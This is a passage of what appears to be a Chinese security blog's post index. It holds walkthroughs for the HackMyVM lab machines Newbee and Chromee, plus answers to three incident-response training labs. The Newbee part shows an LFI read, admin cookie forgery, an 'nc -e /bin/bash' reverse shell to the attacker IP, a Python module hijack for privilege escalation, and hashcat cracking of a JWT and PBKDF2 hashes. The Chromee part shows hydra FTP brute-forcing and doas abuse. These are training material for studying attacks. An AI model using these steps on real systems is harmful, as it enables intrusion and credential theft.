  (Status: 200) [Size: 7907]\n/javascript           (Status: 301) [Size: 321] [--> http://192.168.31.122/javascript/]\n/checkout.php         (Status: 200) [Size: 13307]\n/secret.php           (Status: 200) [Size: 2187]\n/.php                 (Status: 403) [Size: 279]\n/server-status        (Status: 403) [Size: 279]\n~~~\n\nsecret.php可以执行命令，但是必须要先进行身份验证，用lfi包含secret.php试试\n\n~~~\nhttp://192.168.31.122/?hack=php://filter/convert.base64-encode/resource=secret.php\n~~~\n\n可以包含出来\n\n~~~\n#secret.php\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>命令行控制台</title>\n    <style>\n        body {\n            background-color: #1e1e1e;\n            font-family: Consolas, monospace;\n            color: #fff;\n            margin: 0;\n            padding: 0;\n        }\n\n        .console {\n            width: 80%;\n            margin: 50px auto;\n            padding: 20px;\n            background-color: #000;\n            border-radius: 8px;\n            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);\n            height: 400px;\n            overflow-y: auto;\n            font-size: 16px;\n        }\n\n        .output {\n            white-space: pre-wrap;\n            margin-bottom: 10px;\n        }\n\n        .input-container {\n            display: flex;\n            align-items: center;\n        }\n\n        .input-container .prompt {\n            color: #00ff00;\n            margin-right: 5px;\n        }\n\n        .input-container input {\n            background: transparent;\n            border: none;\n            color: #fff;\n            width: 100%;\n            padding: 5px;\n            font-size: 16px;\n            outline: none;\n        }\n\n        .input-container input:focus {\n            border: 1px solid #00ff00;\n        }\n\n        .input-container input::placeholder {\n            color: #888;\n        }\n\n        .console-footer {\n            padding-top: 10px;\n            color: #888;\n            font-size: 12px;\n            text-align: center;\n        }\n    </style>\n</head>\n<body>\n\n<div class=\"console\">\n    <div class=\"output\" id=\"output\">\n        <?php\n\n        if (isset($_COOKIE['AreYouAdmin']) && $_COOKIE['AreYouAdmin'] === 'Yes') {\n\n            if (isset($_GET['command'])) {\n                $command = $_GET['command'];\n                $output = shell_exec($command);\n                echo '<div>\\> ' . htmlspecialchars($command) . '</div>';\n                echo '<div>' . nl2br(htmlspecialchars($output)) . '</div>';\n            }\n        } else {\n            echo '<div>No permission to execute commands, lacking admin permission.</div>';\n        }\n        ?>\n    </div>\n\n    <div class=\"input-container\">\n        <span class=\"prompt\">\\></span>\n        <form method=\"get\">\n            <input type=\"text\" name=\"command\" id=\"input\" placeholder=\"command...\" autocomplete=\"off\">\n        </form>\n    </div>\n</div>\n\n<script>\n    const inputField = document.getElementById(\"input\");\n\n    inputField.focus();\n</script>\n\n</body>\n</html>\n~~~\n\n伪造cookie\n\n~~~\nCookie: AreYouAdmin=yes\n~~~\n\n然后反弹shell\n\n~~~\nnc -e /bin/bash 192.168.31.129 4444\nscript -qc /bin/bash /dev/null #获得交互式shell\n~~~\n\n# 提权\n\n~~~\nwww-data@Newbee:/var/www/html/shop$ sudo -l\nsudo: unable to resolve host Newbee: Temporary failure in name resolution\nMatching Defaults entries for www-data on Newbee:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    targetpw, use_pty\n\nUser www-data may run the following commands on Newbee:\n    (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py\n~~~\n\n~~~\n#vuln.py\nimport random\nimport time\nimport math\nimport string\nimport datetime\n\ndef generate_random_string(length=10):\n\n    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\n\ndef pointless_computation():\n\n    number = random.randint(1, 1000)\n    result = math.sqrt(number) * math.log(number)\n    print(f\"Calculated math nonsense: sqrt({number}) * log({number}) = {result}\")\n\ndef simulate_time_wasting():\n\n    now = datetime.datetime.now()\n    print(f\"Started wasting time at {now}\")\n    time.sleep(2)  # 故意睡眠 2 秒\n    later = datetime.datetime.now()\n    print(f\"Finished wasting time at {later}. Time wasted: {later - now}\")\n\ndef pointless_string_operations():\n\n    rand_str = generate_random_string()\n    print(f\"Generated random string: {rand_str}\")\n    reversed_str = rand_str[::-1]\n    print(f\"Reversed string: {reversed_str}\")\n    print(f\"String length: {len(rand_str)}\")\n\nif __name__ == \"__main__\":\n    pointless_computation()\n    simulate_time_wasting()\n    pointless_string_operations()\n    print(\"All done. The script accomplished nothing useful.\")\n~~~\n\n可以在/var/www/html目录下创建一个random.py文件进行劫持，python文件会优先加载当前目录下的库\n\n~~~\n#random.py\nimport os\nos.system(\"bash -p\")\n~~~\n\n~~~\nwww-data@Newbee:/var/www/html$ sudo -u debian /usr/bin/python3 /var/www/html/vuln.py\ndebian@Newbee:/var/www/html$\n~~~\n\n提到debian用户了，home目录下有一个note.txt和一个config.php\n\n~~~\ndebian@Newbee:~$ cat note.txt\nDamn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me\n~~~\n\n~~~\ndebian@Newbee:~$ cat config.php\n<?php\n$servername = \"localhost\";\n$username = \"root\";\n$password = \"\n\n\n$conn = new mysqli($servername, $username, $password);\n\n............\n............\n~~~\n\n要拿到数据库的密码\n\n查看端口\n\n~~~\ndebian@Newbee:~$ ss -lntup\nNetid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process\nudp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*\ntcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*\ntcp    LISTEN  0       80           127.0.0.1:3306        0.0.0.0:*\ntcp    LISTEN  0       128          127.0.0.1:5000        0.0.0.0:*\ntcp    LISTEN  0       128               [::]:22             [::]:*\ntcp    LISTEN  0       511                  *:80                *:*\n~~~\n\n可以发现本地有5000端口，用socat将5000端口转发出去\n\n~~~\ndebian@Newbee:~$ socat TCP-LISTEN:5001,fork TCP4:127.0.0.1:5000\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Newbee1.png)\n\n是一个留言板，登录处除了admin，其他的都可以随意登录，cookie里有一个jwt，可以猜测是jwt伪造\n\n可以用hashcat爆破\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# hashcat -a 0 -m 16500 ./1 /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n============================================================================================================================================\n* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory required for this attack: 2 MB\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMzEyMyIsImV4cCI6MTc0MzAyNTM4OH0.qTMF9XS0BYo7nKIDg9rFr1qmUfR4btXsLS7GZv2QVW4:noob\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 16500 (JWT (JSON Web Token))\nHash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZS...v2QVW4\nTime.Started.....: Wed Mar 26 08:44:45 2025 (3 secs)\nTime.Estimated...: Wed Mar 26 08:44:48 2025 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  2052.7 kH/s (0.87ms) @ Accel:512 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)\nProgress.........: 5025792/14344385 (35.04%)\nRejected.........: 0/5025792 (0.00%)\nRestore.Point....: 5021696/14344385 (35.01%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#1....: noobface888 -> nona1807\nHardware.Mon.#1..: Util: 44%\n\nStarted: Wed Mar 26 08:44:44 2025\nStopped: Wed Mar 26 08:44:49 2025\n~~~\n\nnoob就是密钥，用户名伪造成admin，可以看到留言板的内容\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Newbee2.png)\n\n~~~\ndebian@Newbee:~$ mysql -uroot -pTheStrongestPasswordHYHcreated\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 5\nServer version: 10.11.6-MariaDB-0+deb12u1 Debian 12\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nNo entry for terminal type \"unknown\";\nusing dumb terminal settings.\nNo entry for terminal type \"unknown\";\nusing dumb terminal settings.\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]>\n~~~\n\nuser库的user表里有debian的密码\n\n~~~\nDatabase changed\nMariaDB [user]> select * from user;\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n| id | username | passwd\n                   | salt                             | passwd_hash_algo |\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n|  1 | debian   | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500$60   |\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n1 row in set (0.001 sec)\n~~~\n\npbdf2爆破参考https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat 2\nsha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# hashcat -a 0 ./2 /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.6) starting in autodetect mode\n\nOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n============================================================================================================================================\n* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCU\n\nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n10900 | PBKDF2-HMAC-SHA256 | Generic KDF\n\nNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!\nDo NOT report auto-detect issues unless you are certain of the hash type.\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nINFO: All hashes found as potfile and/or empty entries! Use --show to display them.\n\nStarted: Wed Mar 26 08:49:58 2025\nStopped: Wed Mar 26 08:49:59 2025\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# hashcat ./2 --show\nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n10900 | PBKDF2-HMAC-SHA256 | Generic KDF\n\nNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!\nDo NOT report auto-detect issues unless you are certain of the hash type.\n\nsha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA:1qaz2wsx\n~~~\n\n用户home目录下还有一个.secret目录，里面有一个密码的压缩包\n\n~~~\ndebian@Newbee:~$ cd .secret/\ndebian@Newbee:~/.secret$ ls\nhint.txt  password.zip\ndebian@Newbee:~/.secret$ cat hint.txt\npassword is md5(key)\n\nand key is in mysql!!!!!!\n~~~\n\n密码是1qaz2wsx的md5\n\n图片是马赛克，网上有一个项目是用来恢复马赛克的\n\nhttps://github.com/spipm/Depixelization_poc\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Newbee3.png)\n\n其实也不用跑，图片的原图就是这个项目的示例图片\n\n密码是`hellofromtheotherside`\n\n~~~\ndebian@Newbee:/tmp$ su - root\nPassword:\nroot@Newbee:~#\n~~~\n\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-Chromee","url":"/2025/03/21/Chromee/","content":"\n\n\n\n\n# 信息搜集\n\narp-scan -l\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:01:8c:4d       PCS Systemtechnik GmbH\n192.168.31.100  08:00:27:f9:e1:65       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.402 seconds (106.58 hosts/sec). 3 responded\n~~~\n\nip为192.168.31.100,然后用nmap扫描端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.100 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 07:14 EDT\nNmap scan report for chromee.hmv (192.168.31.100)\nHost is up (0.0019s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n8080/tcp  open  http-proxy\n23333/tcp open  elxmgmt\nMAC Address: 08:00:27:F9:E1:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 7.02 seconds\n\n~~~\n\n# 80端口\n\ngobuster扫描目录\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# gobuster dir -u \"http://192.168.31.100\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-me\ndium.txt -x .txt,.php\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.100\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/post.php             (Status: 200) [Size: 3]\n/secret.php           (Status: 200) [Size: 549]\n~~~\n\n有一个post.php和secret.php,secret.php不会解析成php会直接下载下来\n\n~~~\n#secret.php\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Secret</title>\n</head>\n<body>\n    <?php\n    $greeting = date('H') < 12 ? '早上好' : (date('H') < 18 ? '下午好' : '晚上好');\n    $visitorIP = htmlspecialchars($_SERVER['REMOTE_ADDR']);\n\n    echo \"<h1>{$greeting}，adriana</h1>\";\n    echo \"<p>当前时间：\" . date('Y-m-d H:i:s') . \"</p>\";\n    echo \"<p>你的IP：{$visitorIP}</p>\";\n    if (isset($_GET['aaa'])) {\n    \t$file_content = file_get_contents('/opt/note/dic.txt');\n    \techo $file_content;\n\t} else {\n    \t\tdie();\n\t}\n    ?>\n</body>\n</html>\n~~~\n\n# 8080端口\n\n先用gobuster扫描一下目录\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# gobuster dir -u \"http://192.168.31.100:8080\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2\n.3-medium.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.100:8080\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/javascript           (Status: 301) [Size: 328] [--> http://192.168.31.100:8080/javascript/]\n/silence              (Status: 403) [Size: 281]\n/server-status        (Status: 403) [Size: 281]\n~~~\n\n有一个silence，访问发现Forbidden了\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee1.png)\n\n用bp的BypassPro插件发现换一种请求会变成301，感觉有问题，后面添加一个index.html发现绕过了\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee2.png)\n\n有一个邮箱，将这个域名添加进hosts里，再去访问http://chromee.hmv/secret.php发现secret.php解析了，GET传入aaa=1\n\n~~~\n下午好，adriana\n当前时间：2025-03-21 12:28:34\n\n你的IP：192.168.31.1\n\nThe Lost Key Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled, realizing the adventure was the real reward.\n~~~\n\n这里有两个人名，adriana和Lily，用cupp各生成一个字典，然后将两个字典合并爆破ftp(23333端口)\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/test]\n└─# hydra -L ./name -P ./pass 192.168.31.100 ftp -s 23333 -f  -t 50\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-21 07:32:30\n[DATA] max 50 tasks per 1 server, overall 50 tasks, 208 login tries (l:2/p:104), ~5 tries per task\n[DATA] attacking ftp://192.168.31.100:23333/\n[23333][ftp] host: 192.168.31.100   login: adriana   password: Lily2020\n[STATUS] attack finished for 192.168.31.100 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-21 07:32:31\n~~~\n\n爆破出了账号密码\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/test]\n└─# ftp adriana@192.168.31.100 23333\nConnected to 192.168.31.100.\n220 (vsFTPd 3.0.3)\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -al\n229 Entering Extended Passive Mode (|||20808|)\n150 Here comes the directory listing.\ndrwxr-xr-x    2 106      115          4096 Mar 09 08:13 .\ndrwxr-xr-x    4 0        0            4096 Mar 09 08:12 ..\n-rw-r--r--    1 0        0            3414 Mar 09 08:13 ...\n-rw-r--r--    1 0        0             495 Mar 07 14:40 dic.txt\n226 Directory send OK.\n~~~\n\n这有...文件，一开始以为是一个目录，cd不进去，也不看报错就没管了(唉，细节决定成败)导致卡了好长时间，但是卡的时候也没有荒废，在/srv目录下有一个zeus.conf，后面提权要用到\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/test]\n└─# cat zeus.conf\npermit follower as softly cmd /usr/local/bin/wfuzz\npermit nopass :softly as root cmd /usr/bin/chromium\npermit nopass :softly as root cmd /usr/bin/kill\n~~~\n\n~~~\nftp> cd /home\n250 Directory successfully changed.\nftp> ls\n229 Entering Extended Passive Mode (|||5941|)\n150 Here comes the directory listing.\ndrwxr-x---    5 1000     1000         4096 Mar 21 08:18 follower\ndrwxr-x---    5 1001     1001         4096 Mar 21 05:37 softly\n226 Directory send OK.\n~~~\n\n还可以知道用户名\n\n...文件是一个私钥，john可以爆破出来密码\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/test]\n└─# john 1 --show\nid:cassandra\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/test]\n└─# ssh follower@192.168.31.100 -i id\nEnter passphrase for key 'id':\nfollower@Chromee:~$\n~~~\n\n# 提权\n\nfollower下有一个cat.git和note.txt\n\n~~~\nfollower@Chromee:~$ cat note.txt\nThink about rotations and the cat’s secrets.\n\n\n47 is not just a number, it's a twist of fate.\n~~~\n\n这个47提示的很明显是rot47\n\ncat.gif用convert可以分离出来12张图片，但是没有用\n\n~~~\nconvert cat.gif 1.jpg\n~~~\n\n不是空间轴可以试试时间轴\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/test]\n└─# identify -format \"%T \" cat.gif\n65 98 65 100 102 98 67 6 6 6 6 6 6\n~~~\n\n将后面的6个6去掉扔进cyberchef中解密然后rot47解密\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee3.png)\n\n得到了p3p573r，因为前面拿到的zeus.conf能够知道follower需要密码才能以softly执行wfuzz\n\n先用find找到wfuzz的路径\n\n~~~\nfollower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find / -name \"wfuzz\" 2>/dev/null\n/home/follower/.config/wfuzz\n/usr/local/bin/wfuzz\n/usr/local/lib/python3.9/dist-packages/wfuzz    #这个就是wfuzz的路径\n~~~\n\n~~~\nfollower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find ./ -writable 2>/dev/null\n./plugins/payloads/file.py\n~~~\n\n在他的wfuzz的目录下找可以写的文件能找到file.py,cat一下\n\n~~~\nfollower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ cat ./plugins/payloads/file.py\nimport pty\npty.spawn(\"/bin/bash\")\n~~~\n\n不用想了，肯定是作者降低难度了后门都留好了\n\n~~~\nfollower@Chromee:~$ /usr/local/bin/doas -u softly /usr/local/bin/wfuzz -z file -u \"127.0.0.1\"\nPassword:\n /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\nsoftly@Chromee:/home/follower$\n~~~\n\n上传pspy64，能发现每隔一段时间root用户都会执行secript.sh\n\n~~~\n2025/03/21 12:53:01 CMD: UID=0     PID=1504   | /bin/sh -c /root/script.sh\n2025/03/21 12:53:01 CMD: UID=0     PID=1505   | /bin/bash /root/script.sh\n~~~\n\n结合题目名Chromee和前面得到的zeus.conf，能猜到肯定和浏览器有关系，运行linpeas.sh能看到/media下有一个debug.kdbx\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/test]\n└─# file debug.kdbx\ndebug.kdbx: PDF document, version 1.7\n~~~\n\n是一个pdf文件\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee4.png)\n\n去网上查这个东西，谷歌浏览器自带这个工具chrome://inspect/，还有这个9222的默认端口（后面要用到）\n\n先写一个authorized_keys\n\n在网上查到开启远程debug的命令\n\n~~~\ndoas /usr/bin/chromium --headless --remote-debugging-port=9222 --no-sandbox http://127.0.0.1\n~~~\n\n因为靶机没有桌面，所以一定要带上--headless，不然会报错，启动好后再用socat端口转发\n\n~~~\nsoftly@Chromee:~$ ./socatx64.bin TCP-LISTEN:9999,fork TCP4:127.0.0.1:9222\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee5.png)\n\n用谷歌浏览器连接，打开第一个连接\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee6.png)\n\n等一会就会发现向127.0.0.1/post.php发送一个key，不用base64解码，这个就是root的密码。\n\nchromium的远程端口必须要是9222默认端口否则他监听不到就很难受\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"应急响应靶机训练-Web3","url":"/2025/02/18/应急响应靶机训练-Web3/","content":"\n# 隐藏用户名称\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/1.png)\n\n这还没开始第一道题就已经结束了 \n\n# 攻击者的两个IP地址\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/2.png)\n\n远程登录找到一个ip\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/3.png)\n\n在hacker的目录下能找到一个system.bat的文件，可以看到向web里面写了一个webshell，可以去查看apache的日志\n\n还有第一个flag\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/4.png)\n\n第二个IP\n\n# 黑客遗留下的flag【3个】\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/5.png)\n\n计划任务里有一个flag\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/6.png)\n\n可以看到web是一个Z-blog，去官网下载一个修改后台密码的工具\n\nhttps://bbs.zblogcn.com/thread-83419.html\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/7.png)\n\n可以看到还有一个hacker用户\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/8.png)\n\n第三个flag\n","tags":["靶机"],"categories":["应急响应"]},{"title":"应急响应靶机训练-Web2","url":"/2025/02/08/应急响应靶机训练-Web2/","content":"\n# 1.攻击者的IP地址（两个）？\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/3.png)\n\n第一个ip在apache的日志里，另一个是登录日志可以直接用工具windows1check或者事件查看器里查找\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/4.png)\n\n# 2.攻击者的webshell文件名？\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/1.png)\n\n查看apache的日志发现system.php是webshell的文件名\n\n# 3.攻击者的webshell密码？\n\n密码是hcak6618\n\n# 4.攻击者的伪QQ号？\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/5.png)\n\n众所周知，qq登陆过后会默认会在文档里创建一个Tencent File里面会记录每个登陆过的qq号，在FileRecv里是通过qq下载的文件\n\n# 5.攻击者的伪服务器IP地址？\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/6.png)\n\n黑客通过qq下载了一个frp，在frpc的配置文件里有伪服务器IP和端口\n\n# 6.攻击者的服务器端口？\n\n65536\n\n# 7.攻击者是如何入侵的（选择题）？\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/7.png)\n\n通过分析ftp的日志文件可以发现，攻击者通过爆破ftp admin的密码登录成功，然后上传system.php文件\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/8.png)\n\n看phpstudy的ftp配置可以发现ftp的根目录在www目录，所以上传的system.php可以访问到\n\n# 8.攻击者的隐藏用户名？\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/2.png)\n\n学到新招，win+r->cmd->lusrmgr.msc可以查看本地用户和组，或者C盘USER能找到hack887$\n","tags":["靶机"],"categories":["应急响应"]},{"title":"应急响应靶机训练-Web1","url":"/2025/02/07/应急响应靶机训练-Web1/","content":"\n\n\n~~~\n前景需要：小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，并找来正在吃苕皮的hxd帮他分析，这是他的服务器系统，请你找出以下内容，并作为通关条件：\n1.攻击者的shell密码\n2.攻击者的IP地址\n3.攻击者的隐藏账户名称\n4.攻击者挖矿程序的矿池域名(仅域名)\n5.有实力的可以尝试着修复漏洞\n~~~\n\n# 1.攻击者的shell密码\n\n打开phpstudy找到网站的根目录，然后用D盾扫\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/1.png)\n\n能找到是一个冰蝎马，密码是rebeyond\n\n# 2.攻击者的IP地址\n\n查看phpstudy的日志文件，有apache和nginx，nginx的日志全是0kb，打开apache的access.log文件搜索shell.php能找到攻击者的ip\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/2.png)\n\n# 3.攻击者的隐藏账户名称\n\n可以直接查看C盘的用户有一个hack168$\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/3.png)\n\n或者可以查看登录的日志，如果不用工具的话就在事件查看器里-安全找事件ID为4624的事件\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/4.png)\n\n# 4.攻击者挖矿程序的矿池域名(仅域名)\n\n在C:\\Users\\hack168$\\Desktop里有一个Kuang，这是一个python编译的exe文件，先转一下pyc然后反编译就行了\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/6.png)\n\n# 